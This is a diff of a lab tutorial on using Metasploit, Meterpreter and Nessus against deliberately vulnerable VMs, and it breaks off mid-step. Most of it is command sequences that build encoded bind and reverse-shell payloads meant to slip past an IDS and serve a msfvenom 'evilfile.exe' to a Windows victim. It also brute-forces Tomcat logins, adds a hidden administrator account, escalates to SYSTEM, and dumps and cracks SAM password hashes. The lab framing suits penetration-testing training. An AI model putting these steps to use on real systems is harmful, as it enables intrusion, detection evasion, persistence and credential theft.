@@ -1,29 +1,19 @@
-﻿
 **********************************************
 Straightforward Training™
 Using Metasploit/Meterpreter/Nessus (Advance)
 Author: Saulo S. Ortiz
 Date: 20180602
-Updated 20180703
-~~~ IN PROGRESS BUT USABLE ~~~
+Updated 20180705
 **********************************************
 
 DISCLAIMER
-1.	The steps gathered in this guide come from several different sources which are freely available throughout the
-internet.
+1.	The steps gathered in this guide come from several different sources which are freely available throughout the internet.
 
-2.	As always, I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in
-this guide nor by following it…do so at your own risk. I have tested these steps myself and found no issues/damage to my own
-systems. Also I am not responsible for software links, software availability or condition.
+2.	As always, I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide nor by following it…do so at your own risk. I have tested these steps myself and found no issues/damage to my own systems. Also I am not responsible for software links, software availability or condition.
 
-3.	You will need to have some common Linux understanding to be able to follow this guide, like installing and configuring your
-Linux distro in a VM as well as basic VM experience. I will not be covering these steps in noob detail…these steps are NOT for
-people that have no idea how to install, remove, update/upgrade, and configure Linux or VMs. Commands will be mentioned but
-to a minimum.
-
+3.	You will need to have some common Linux knowledge to be able to follow this guide, like what an .iso file is, installing and configuring your Linux distro in a VM as well as basic VM knowledge. I will not be covering steps in deep detail. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and configure Linux/Windows OS or VMs.
 -------------------------------------------------------------------------------------------------------------------------------
-Note: If you don’t save the state of the VMs you will need to go through the process of starting the database service then, any other services
-where you left off
+Note: If you don’t save the state of the VMs you will need to go through the process of starting the database service then, any other services where you left off
 -------------------------------------------------------------------------------------------------------------------------------
 
 WHAT YOU’LL NEED
@@ -31,18 +21,17 @@ WHAT YOU’LL NEED
 	a.	500GB hard drive space
 	b.	8GB memory
 	c.	6 core CPU
-	d.	Best: 16GB RAM or better, a 6-8 core CPU or better
-
+	d.	Best: 16GB RAM or better, 6-8 core CPU or better
 2.	Kali .ovm for VMware or OracleVirtualbox (not .iso), Mint or Kubuntu (.iso)
-
 3.	Nessus (7.1.0-ubuntu1110_amd64.deb)
-
-4.	VMWare Workstation 12 or higher or OracleVirtualBox
-
+4.	VMWare Workstation 12 or higher or latest OracleVirtualBox
 5.	Metasploitable2 – Linux (https://www.vulnhub.com/entry/metasploitable-2,29/)
+6.	Windows XP and Windows 7 .iso files
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #1: SETUP
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 1.	Download and install your VM program
 
 2.	Download the Linux distro you want and create a VM for it and for metasploit using the configuration setup below
@@ -63,16 +52,16 @@ STEP #1: SETUP
 	d.	The hdd is already set to 80GB…nothing we can do about it
 	e.	Go to Advance and set the hdd to Independent then Persistent
 	f.	Log-in to Kali and do an update and upgrade also
-		i.	…this will take long while to complete
+		i.	…this will take long time to complete
 
 5.	Install Metasploit-Framework for Kubuntu or Mint
-	a.	sudo apt-get update
-	b.	sudo apt-get install postgresql
-	c.	cd /opt
-	d.	sudo wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
-	e.	sudo mkdir metasploit
-	f.	sudo chmod +x ./metasploit-latest-linux-x64-installer.run
-	g.	sudo ./metasploit-latest-linux-x64-installer.run
+	a.	Type sudo apt-get update
+	b.	Type sudo apt-get install postgresql
+	c.	Type cd /opt
+	d.	Type sudo wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
+	e.	Type sudo mkdir metasploit
+	f.	Type sudo chmod +x ./metasploit-latest-linux-x64-installer.run
+	g.	Type sudo ./metasploit-latest-linux-x64-installer.run
 
 6.	Metasploitable2 VM setup
 	a.	512MB memory
@@ -82,12 +71,13 @@ STEP #1: SETUP
 7.	Download Nessus
 	a.	https://www.tenable.com/downloads/nessus
 
-8.	Decompress the .deb file:
+8.	Installing the Nessus .deb file:
 	a.	In a terminal screen navigate to /Downloads
 	b.	Type dpkg –i <deb_file.deb>
 		i.	…the file will unpack and install…remember to sudo if you’re not in Kali
+		ii.	…once its installed make a note of the http link that shows on the screen…mine reads (https://kali:8834) yours could be different…this is important for later!!!
 
-9.	Follow the instructions to start Nessus then navigate to the https link in your browser
+9.	Follow the instructions to start the Nessus service, then navigate to the https link in your browser
 	a.	Select Advance button if it reads that your connection is not secure
 	b.	Add exception… button
 	c.	Confirm Security Exception button
@@ -98,65 +88,72 @@ STEP #1: SETUP
 	c.	Go to https://www.tenable.com/products/nessus-home
 	d.	Wait about 8-10 minutes for plugin downloads to complete
 
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 Note: When trying to do these steps after setup you’ll need to do the following:
-	1.	Start Nessus service: /etc/init.d/nessusd start
-	2.	Go to the https link as before
-----------------------------------------------------------------------------------------------------------------------------------------
+1.	Start Nessus service: /etc/init.d/nessusd start
+2.	Go to the https link as before
+-------------------------------------------------------------------------------------------------------------------------------
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #2: INTRO TO METASPLOIT
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Default login info is:
-•	Metaspoloit: msfadmin/msfadmin
-•	Kali: root/toor
+	•	Metaspoloit: msfadmin/msfadmin
+	•	Kali: root/toor
+Log-in and get the IP address for both…will need them soon!
 
-Use it and get the IP address…will need it soon!
-1.	Make sure your NIC in metasploit is set to NAT before running it
+-------------------------------------------------------------------------------------------------------------------------------
+Note: rhost is the victim VM, lhost is Kali
+-------------------------------------------------------------------------------------------------------------------------------
 
-2.	Use the default login and password then identify the eth0 IP address…we’ll need it soon
+1.	Make sure the NIC in your Linux VM and in metasploit VM are both set to NAT before running them
 
-3.	While in your Linux distro:
-	a.	We want to save data in a database for later use…type service postgresql start
+2.	Use the default login information and identify the eth0 IP address of each…we’ll need it soon
 
-4.	Type msfconsole to start metasploit…in Kali you can click on the icon
-	a.	To verify msf and the database are connected type db_status
+3.	We want to save the data of everything we do in these steps to a database for later use and easy retrieval so we run the database service. While in your Linux distro
+	a.	 Type service postgresql start
 
-----------------------------------------------------------------------------------------------------------------------------------------
+4.	Type msfconsole to start metasploit…in Kali you can click on the icon also
+
+5.	To verify that msfconsole and the database are connected type db_status
+
+-------------------------------------------------------------------------------------------------------------------------------
 Note: Type help and the command to get more information about it
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 
-5.	You can use the commands help, show, search and back. For example…search for the payload reverse_tcp
-	a.	You’ll get a huge list but we just want the one we mentioned
+6.	You can use the commands help, show, search and back. For example…search for the payload reverse_tcp
+		i.	…you’ll get a huge list but we just want the one we mentioned
 
-6.	You can copy and paste it then executed which will take you to that payload shell
+7.	You can copy and paste it then executed which will take you to that payload shell
 	a.	Now type show options for a list of options that each payload has
 		i.	…LHOST = local host
 	b.	Type set lhost <kali_ip_address>
 	c.	Type show options
-	d.	Type back to return to the msf shell
+	d.	Type back to return to the msfconsole shell
 		i.	…the settings we just did will become null
 
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 Note: Remember to use autocomplete using your Tab button
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 
-7.	To set the same parameter globally:
+8.	To set the same parameter globally:
 	a.	Go back to the payload
 	b.	Type setg lhost  <kali_ip_address>
 		i.	…now when you back out of the payload shell this parameter will remain permanently
-	c.	To clear the global parameter you need to be inside the payload then:
-		i.	…type unsetg lhost
-		ii.	…this will not unset from the payload itself…for that type unset lhost
-	d.	Type back to return to the msf shell
+	c.	Type unsetg lhost to clear the global parameters
+		i.	…you need to be inside the payload then:
+	d.	Type unset lhost to unset the payload itself
+		i.	…notice one command is unsetg the other is unset
+	e.	Type back to return to the msfconsole shell
 
-8.	You can also search for:
+9.	You can also search for:
 	a.	a platform: search platform:osx or search platform:windows
 	b.	help search for author, bid, cve, etc…
-	c.	or post payloads as search platform:post
+	c.	or any post payloads as search platform:post
 
-9.	Let’s load a common exploit:
-	a.	Type search excel
-		i.	…select the one that reads featheader
+10.	Let’s load a common exploit:
+	a.	Type search excel and select the one that reads FEATHEADER
 	b.	Type show options
 	c.	Type show payloads to see what else you can attach to this exploit
 	d.	Type show advanced for any advance options
@@ -165,47 +162,47 @@ Note: Remember to use autocomplete using your Tab button
 	f.	Type show targets to see the targets you can use this against
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #3: CREATE A BIND SHELL PAYLOAD
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 1.	Type use payload/windows/shell_bind_tcp
+	a.	Type help
+	b.	Type generate –h to see options
+	c.	Type generate to generate a shell code
 
-2.	Type help
-
-3.	Type generate –h to see options
-
-4.	Type generate to generate a shell code
-
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 Note: A bind_tcp_shell will bind us to a port on the target to get a shell.
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 
-5.	Type setg rhost <ip_address>
+2.	Type setg rhost < metasploitable2_ip_address>
 	a.	Type show options to view the parameters
 
-6.	Type generate again
+3.	Type generate again
 	a.	Notice the set parameters are in the payload
 
-----------------------------------------------------------------------------------------------------------------------------------------
-Note: An IDS may be able to notice this payload and block it. If you knew which portion of this code triggers the IDS then you can edit it by using the command.
-The most common bytes of this payload that can trigger an IDS are \xff and \x50.
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+Note: An IDS may be able to notice this payload and block it. If you knew which portion of this code triggers the IDS then you can edit it by using the command. The most common bytes of this payload that can trigger an IDS are \xff and \x50.
+-------------------------------------------------------------------------------------------------------------------------------
 
-7.	Remove the triggers from the generated payload:
+4.	Remove the triggers from the generated payload…
 	a.	Type generate –b \xff\x50
 		i.	…it will generate a new payload without these characters…but there’s a limit to how many you can remove before a payload cannot be generated
 		ii.	…your payload size will change…keep an eye out for this
 
-8.	Type show encoders and select x86/shikata_ga_nai then change the LPORT to 5555 and make the payload in BASH format
+5.	Type show encoders and select x86/shikata_ga_nai then change the LPORT to 5555 and make the payload in BASH format
 	a.	Type generate –e x86/shikata_ga_nai –b \xff –i 3 –o lport=5555 –t bash
 		i.	…could not complete with \x50 in it
 		ii.	…what’s the byte size?
 		iii.	…you can use formats...go to help for these
 
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 Note: -i 3 iterates the code 3 times…meaning, code and recode up to 3 times. This supposedly makes the payload harder to detect.
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #4: OTHER MSFCONSOLE COMMANDS
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 1.	With workspace you can have multiple screens areas where you can run commands independent from others. Like using Shift + Ctrl + T.
 	a.	Type workspace to see the default
 	b.	Type workspace –a metasploitable
@@ -225,12 +222,13 @@ STEP #4: OTHER MSFCONSOLE COMMANDS
 		ii.	Ex. host –c mac,os_sp,info
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #5: USING METERPRETER
-Meterpreter is a payload delivered through msfconsole that creates a shell in the target’s memory which doesn’t write anything to the disc. In
-this section we’ll try to get a shell through the postgresql database running in metasploitable.
-
-1.	While in msfconsole…if you have not done so yet, set the global parameter of the remote host…which is the metasploitable VM:
-	a.	Type setg rhost <metasploitable2_ip_address>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Meterpreter is a payload delivered through msfconsole that creates a shell in the target’s memory which doesn’t write anything to the disc. In this section we’ll try to get a shell through the postgresql database running in metasploitable.
+1.	While in msfconsole…
+	a.	If you have not done so yet, set the global parameter of the remote host (rhost)…which is the metasploitable VM
+	b.	Type setg rhost <metasploitable2_ip_address>
 
 2.	Type nmap –n –sV <metasploitable2_ip_address>
 		i.	…these are all the vulnerable ports and services running
@@ -242,7 +240,6 @@ this section we’ll try to get a shell through the postgresql database running 
 	a.	Set the password: set password postgres
 	b.	Type show targets
 	c.	Type show options
-		i.	…remember that the rhost is the IP of the metasploitable the lhost is Kali’s IP address
 	d.	Type exploit or run
 		i.	…if you’re doing this on different day, you may need  to set your global parameters again
 
@@ -253,10 +250,11 @@ this section we’ll try to get a shell through the postgresql database running 
 6.	Use the background command which puts the current session in the background in metasploit so you can come back to it later or run other sessions
 
 7.	Type sessions to view current sessions in metasploit and the target or sessions of multiple targets
+	a.	Type sessions –h for additional session options
+		i.	…type sessions –k # to kill a session
+		ii.	…type sessions # to restart a session
 
-8.	Type sessions –h for additional session options
-
-9.	While in meterpreter:
+8.	While in meterpreter…
 	a.	Type cat /etc/passwd
 	b.	Type ifconfig
 	c.	Type netstat –an
@@ -274,56 +272,51 @@ this section we’ll try to get a shell through the postgresql database running 
 		i.	…you get even more info on what is running and get an idea what to do next
 	m.	Type sysinfo
 
-----------------------------------------------------------------------------------------------------------------------------------------
-Note: When you background a session it “kicks you out” and places that session in the background for later use…you’re not really kicked out…it’s more
-like putting your call on-hold then you can come back to it without having to go through the entire connection process. Do sessions to see how the session
-is set in the background.
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+Note: When you background a session it “kicks you out” and places that session in the background for later use…you’re not really kicked out…it’s more like putting your call on-hold then you can come back to it without having to go through the entire connection process. Do sessions to see how the session is set in the background.
+-------------------------------------------------------------------------------------------------------------------------------
 
-10.	Type exit to drop out of the meterpreter shell
+9.	Type exit to drop out of the meterpreter shell
 		i.	…if you’re running processes you can Ctrl+C then exit
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #6: SCANNING WITH MSFCONSOLE (Part #1)
-1.	Type hosts
-
-2.	Type services
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+1.	Type hosts then type services
 		i.	…shows the last service which was postgreSQL
 
-3.	Delete the host:
+2.	Delete the host:
 	a.	hosts –d <rhost_ip_address>
 
-4.	Run nmap:
-	a.	nmap –A <rhost_ip_address>
+3.	Run nmap in msfconsole…
+	a.	nmap –A < metasploitable2_ip_address>
 		i.	…you can pipe the results to a .txt file and you can also grep it
-		ii.	…you can also use the –vv to see results while scanning
+		ii.	…you can also use the –vv to see verbose while scanning
 
-----------------------------------------------------------------------------------------------------------------------------------------
-Note: We show the following services with ports: FTP, ssh, telnet, smtp, apache, rpcbind, netbios (Samba), a remote shell, a root shell, java, another
-FTP, MySQL, VNC, x11, unreal gaming server irc, two more apache servers, MAC address, etc. Lots of things to exploit.
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+Note: We can see the following services are running with their ports: FTP, ssh, telnet, smtp, apache, rpcbind, netbios (Samba), a remote shell, a root shell, java, another FTP, MySQL, VNC, x11, unreal gaming server irc, two more apache servers, MAC address, etc. Lots of things to exploit!
+-------------------------------------------------------------------------------------------------------------------------------
 
-5.	Let’s populate nmap with the info we captured. This will populate the database so we can search through it easier:
-	a.	Type db_nmap –A <rhost_ip_address>
+4.	Let’s populate the database with the nmap info we captured so we can search through it easier…
+	a.	Type db_nmap –A < metasploitable2_ip_address>
 	b.	Type hosts
 		i.	…now we see the host info
-	c.	Type services -u
-		i.	…to see what services it discovered
-		ii.	…services –h for more info
+	c.	Type services -u …to see what services it discovered
+	d.	Type services –h for more info
 
-6.	Type search portscan
+5.	Type search portscan
 	a.	Type use auxiliary/scanner/portscan/tcp
 	b.	Type show options
-	c.	Type setg rhosts <rhost_ip_address>
-		i.	…this command uses rhosts NOT rhost to set the IP address
+	c.	Type setg rhosts <metasploitable2_ip_address>
+		i.	…notice this command uses rhosts and not rhost to set the IP address
 	d.	Type exploit or run
 		i.	…once the scan is done, we’ll see the open TCP ports
 
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #7: SCANNING WITH MSFCONSOLE (Part #2)
-Using the command services –u (same as services) we can see what programs the target has running and we can scan and exploit. Once you
-have a target always use this command!
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Using the command services –u (same as services) we can see what programs the target has running and we can scan and exploit. Once you have a target always use this command!
 1.	Go back then use /auxiliary/scanner/mysql/mysql_version to scan MySQL for its version
 	a.	Type options and check rhost is set
 	b.	Type run
@@ -357,7 +350,7 @@ have a target always use this command!
 	e.	Type ls –lah
 	f.	Type cd msfadmin
 	g.	Type ls –a
-	h.	Use Ctrl+C to leave the FTP
+	h.	Use Ctrl+C to leave the ftp
 
 8.	Type services –u
 	a.	Type services -p 21 to see any services running on that port
@@ -368,10 +361,9 @@ have a target always use this command!
 		ii.	…try it using another port
 		iii.	…if you want all info then omit the rest of the command after 21
 
-----------------------------------------------------------------------------------------------------------------------------------------
-Note: At this point you can view every successful attempt by typing creds. This information is stored in the database and shows your successful
-connections along with important information.
-----------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+Note: At this point you can view every successful attempt by typing creds. This information is stored in the database and shows your successful connections along with important information.
+-------------------------------------------------------------------------------------------------------------------------------
 
 10.	Go back then type services
 
@@ -381,14 +373,15 @@ connections along with important information.
 
 12.	Type use auxiliary/scanner/vnc/vnc_none_auth
 	a.	Type options
-		i.	…check the rhosts info
-	b.	Type run (or exploit)
-		i.	…it found the VNC protocol version [3,4]…you can also see this using services
+		i.	...check the rhosts info
+	b.	Type run or exploit
+		i.	…it found the VNC protocol version [3,  4]…you can also see this using services
 		ii.	…it did not find it to have a blank password authentication
 		iii.	…continue to identify how to get in using the data you see here and also using services -u
 
-
-STEP #8: WEB APPLICATION SCANNING WITH MSFCONSOLE
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #8: WEB APPLICATION VULNERABILITY SCANNING
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 1.	Go back then type services
 
 2.	Using the browser we’ll see what we can see under the IP address and port 80…what program in the list is the one using port 80?
@@ -403,13 +396,13 @@ STEP #8: WEB APPLICATION SCANNING WITH MSFCONSOLE
 5.	Type wmap _sites
 		i.	…check out the options
 
-6.	Type wmap_sites –a <http://metasploit_IP>
+6.	Type wmap_sites –a <http://metasploit_IP_address>
 		i.	…this command adds a website to metasploit
 	a.	Type wmap_sites –l to see if it was created
 
 7.	Type wmap_targets –h
 
-8.	Type wmap_targets –t <http://metasploit_IP>
+8.	Type wmap_targets –t <http://metasploit_IP_address>
 
 9.	Type wmap_targets –l
 		i.	…you can also add SSL
@@ -427,10 +420,11 @@ STEP #8: WEB APPLICATION SCANNING WITH MSFCONSOLE
 		i.	…it displays all the vulnerabilities found
 
 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #9: SCANNING WITH NESSUS (COMMAND LINE)
-We can connect to Nessus via the web browser or though msf console...we’ll start with the console.
-
-1.	Ctrl+L to clear then exit msf
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+We can connect to Nessus via the web browser or though msfconsole...we’ll start with the console.
+1.	Ctrl+L to clear then exit msfconsole
 
 2.	Run Nessus…
 	a.	Type /etc/init.d/nessus start
@@ -438,8 +432,7 @@ We can connect to Nessus via the web browser or though msf console...we’ll sta
 		i.	…you can also use service nessusd start
 		ii.	…and check with service nessusd status
 
-3.	Go back into msf…
-	a.	Type msfconsole
+3.	Type msfconsole to go back into it
 
 4.	Type load nessus
 		i.	…it should say successfully loaded, if not, check if its running or if its installed
@@ -454,14 +447,13 @@ We can connect to Nessus via the web browser or though msf console...we’ll sta
 	b.	Type ifconfig and find the IP address if you do not have it already
 	c.	Type nessus_connect <username:password>@<host_ip>:8834
 		i.	…it should read user authenticated successfully
-		ii.	…you may need to add at the end ssl_ignore
+		ii.	…you may need to add at the end ssl_ignore if you have SSL errors
 	d.	Type nessus_help
 	e.	Type nessus_user_list
 	f.	Type nessus_admin
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: As this is a brand new Nessus installation there will be no policies available, therefore you need to create some via the GUI
-before we can continue.
+Note: As this is a brand new Nessus installation there will be no policies available, therefore you need to create some via the GUI before we can continue.
 -------------------------------------------------------------------------------------------------------------------------------
 
 8.	Go to the browser and type https:<host_ip_address>:8834
@@ -481,12 +473,13 @@ before we can continue.
 		i.	…you’ll need the entire UUID number
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: Take note of the Scan ID because you did not launched the scan, you just create a queue
+Note: Take note of the Scan ID because you did not launched the scan you just create a scan in queue
 -------------------------------------------------------------------------------------------------------------------------------
 
 13.	Type nessus_scan_launch <scan_ID>
+		i.	…should reads scan successfully launched
 
-14.	Type nessus_scan_list …to see running scans…this will take  while
+14.	Type nessus_scan_list …to see a list of scans and their status…this will take  while
 	a.	Type nessus_scan_list again to see if the scan completed
 		i.	…take note of the Scan ID
 
@@ -509,13 +502,16 @@ Note: Take note of the Scan ID because you did not launched the scan, you just c
 Note: Of course you can do all this via the GUI and it would be faster and easier…I just wanted you to use the terminal screen to see it also works.
 -------------------------------------------------------------------------------------------------------------------------------
 
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STEP #10: HACKING A TOMCAT SERVER
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 1.	Type search tomcat
 	a.	Type use auxiliary/scanner/http/tomcat_mgr_login
 
 2.	Type use auxiliary/scanner/http/tomcat_mgr_login
 	a.	Type options
-	b.	Type setg rhosts <rhost_ip_address>
+	b.	Type setg rhosts <metasploitable2_ip_address>
 		i.	…if not already set
 	c.	Type set login tomcat
 	d.	Type set password tomcat
@@ -523,21 +519,24 @@ STEP #10: HACKING A TOMCAT SERVER
 	f.	Type set blank_passwords true
 	g.	Type run or exploit
 		i.	…check for the green plus sign [+]
+
 3.	Verify the credentials information
 	a.	Type creds
 
-4.	Open the browser and type the <metasploitable_ip_address>:8180
+4.	Open the browser and type the <metasploitable2_ip_address>:8180
 	a.	Click on Status link
 	b.	Scroll down to the header http-8180 and verify the Client connected to the VHost which is kali to tomcat server
 	c.	You can now close the browser and exit the scanner
 
 
-STEP #11: GETTING A REVERSE SHELL IN WINDOWS XP
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #11: GETTING A REVERSE SHELL/ESCALATING RIGHTS IN WINDOWS XP
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 For this exercise you will need a Windows XP to be the “victim”. You can easily find an .iso on the internet even if it’s a 30 day trial version.
 1.	Install and change your Windows VM NIC from NAT to host-only
-	a.	A XP VM can use 1 CPU and 1GB ram (using for the exercise)
+		i.	…a XP VM can use 1 CPU and 1GB ram
 
-2.	Use msfvenom tool to generate the payload
+2.	Use msfvenom tool to generate the payload…
 	a.	Type msfvenom --help-formats to view a list of formats for your payload
 	b.	Type msfvenom –p windows/meterpreter/reverse_tcp LHOST= <kali_ip_address> LPORT =443 –f exe –o /var/www/evilfile.exe
 		i.	…you can substitute -o with >
@@ -565,13 +564,10 @@ For this exercise you will need a Windows XP to be the “victim”. You can eas
 		i.	…once the file downloads run it
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: If you have problems downloading the file from Kali to your Windows VM then just do a transfer using a USB from one VM to
-another. You can use the top menu in your VM program (not the VM machine) to connect and disconnect the USB from one VM to the
-other. Also, depending on the VM software you are using there are several ways to do this and you may need additional software
-for the VM program itself. Google the problem if you’re stuck…this is the best way to troubleshoot and learn.
+Note: If you have problems downloading the file from Kali to your Windows VM then just do a transfer using a USB from one VM to another. You can use the top menu in your VM program (not the VM machine) to connect and disconnect the USB from one VM to the other. Also, depending on the VM software you are using there are several ways to do this and you may need additional software for the VM program itself. Google the problem if you’re stuck…this is the best way to troubleshoot and learn.
 -------------------------------------------------------------------------------------------------------------------------------
 
-6.	Run the file in the victim’s machine then a meterpreter prompt will show up in Kali on the same terminal you ran msfconsole from
+6.	Run the evilfile.exe file in the victim’s machine, then in a meterpreter prompt should show up in Kali on the same terminal you ran msfconsole from
 
 7.	Here you can run several cool things like:
 	a.	Type help
@@ -587,27 +583,26 @@ for the VM program itself. Google the problem if you’re stuck…this is the be
 	f.	Type shell
 		i.	…this will give you a cmd prompt shell inside meterpreter that you can use to run MS commands in the victim’s system
 	g.	Type net user
-		i.	…you can see users and their privileges
+		i.	…you can see the users
 	h.	Type net user evildoer P@$$w0rd! /add
 		i.	…yep, you now have an account in that machine! (((Muahahahahaa!!)))
 	i.	Type net localgroup Administrators evildoer /add
 		i.	…you now have admin rights! (((maniacal laugh…maniacal laugh!)))
 
-8.	Use Ctrl+C to break out of the Windows cmd prompt and go back to the meterpreter prompt
+8.	Type exit to go back to the meterpreter prompt
 
 9.	As Admin we can now let’s elevate our privileges one level higher to System
 	a.	Type getsystem
 	b.	Type getuid
-		i.	…it states: “Server username: NT AUTHORITY\SYSTEM.” Here we can do anything we want…even destroy it! (((I’m about to pass out from all the evil laughing!)))
+		i.	…it states: “Server username: NT AUTHORITY\SYSTEM.” Here we can do anything we want…run programs through the cmd prompt of delete files! (((I’m about to pass out from all the evil laughing!)))
 
 10.	Let’s try and get a hash dump to get into the system’s SAM file which holds all users and their keys…this may disconnect you
 	a.	Type run hashdump
 		i.	…you now have the SAM file with users and keys
-		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems in the wild unless you count ATM
-		machines; the second part you can use against a rainbow table in a program or an online rainbow table website
+		ii.	…the first part before of the hash (before the colon) is not as important anymore because there are not a lot of XP systems in the wild unless you count ATM machines; the second part you can use against a rainbow table program or an online rainbow table website
 
 -------------------------------------------------------------------------------------------------------------------------------
-Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google what they mean.
+Note: Take a look at the SID numbers in the hash dump…what is 500 and 501? Google what they mean.
 -------------------------------------------------------------------------------------------------------------------------------
 
 11.	Copy the second part of the hash and just before the triple colons for the evildoer user
@@ -616,10 +611,6 @@ Note: Take a look at the numbers in the hash dump…what is 500 and 501? Google 
 	c.	Scroll down and enter the CAPTCHA then hit the submit button
 	d.	Scroll up and verify your hash was found…it will also spell it on the right side box
 
--------------------------------------------------------------------------------------------------------------------------------
-Note: XP uses NT. We know this because the triple colons. Windows 7 and later uses NTLM
--------------------------------------------------------------------------------------------------------------------------------
-
 12.	Since you now have the hash dump you can take all of them and save them with notepad++ so you can run them through rainbow tables
 
 13.	Optional…another useful command to use while in shell is sc. Use it to communicate with the Service Control Manager and the services
@@ -627,18 +618,21 @@ Note: XP uses NT. We know this because the triple colons. Windows 7 and later us
 	b.	Type sc stop
 
 
-STEP #12: GETTING A REVERSE SHELL IN WINDOWS 7
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+STEP #12: GETTING A REVERSE SHELL/ESCALATING RIGHTS IN WINDOWS 7
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 For this exercise you will need a Windows 7 VM to be the “victim”. You can easily find an .iso on the internet even if it’s a 30 day trial version.
-1.	Install and change your Windows VM NIC from NAT to host-only
-	a.	A Win7 VM can use 1 CPU with 2 cores and 2GB ram, 4GB if you can spare it is best
+1.	Install and change your Windows 7 VM NIC from NAT to host-only
+		i.	…A Win7 VM can use 1 CPU with 2 cores and 2GB ram, 4GB if you can spare it is best
+		ii.	…by default the screen shuts down in 10 minutes and the system in 30 minutes…find where to change this to never.
 
-2.	Use msfvenom tool to generate the payload
+2.	Use msfvenom tool to generate the payload…
 	a.	Type msfvenom --help-formats to view a list of formats for your payload
 	b.	Type msfvenom –p windows/meterpreter/reverse_tcp LHOST= <kali_ip_address> LPORT =443 –f exe –o /var/www/evilfile.exe
 		i.	…you can substitute -o with >
 		ii.	…ignore the “No encoder or badchars" comment
 
-3.	Start the Apache webserver
+3.	Start the Apache webserver…
 	a.	Type service apache2 start
 	b.	Type service apache2 status to verify
 
@@ -652,7 +646,7 @@ For this exercise you will need a Windows 7 VM to be the “victim”. You can e
 	g.	Type run or exploit
 		i.	…meterpreter is in listening mode
 
-5.	Run your Windows VM “victim” machine
